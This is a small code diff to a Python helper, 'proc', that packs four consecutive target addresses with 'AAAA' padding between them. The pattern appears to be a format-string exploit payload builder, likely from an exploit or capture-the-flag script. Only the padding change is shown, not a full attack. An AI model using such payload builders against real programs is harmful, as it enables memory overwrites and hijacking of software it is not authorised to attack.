@@ -8,9 +8,15 @@ def proc(address, value):
     outputted = 0
     out += struct.pack("I", address+3)
     outputted += 4
+    out += 'AAAA'
+    outputted += 4
     out += struct.pack("I", address+2)
     outputted += 4
+    out += 'AAAA'
+    outputted += 4
     out += struct.pack("I", address+1)
+    outputted += 4
+    out += 'AAAA'
     outputted += 4
     out += struct.pack("I", address)
     outputted += 4
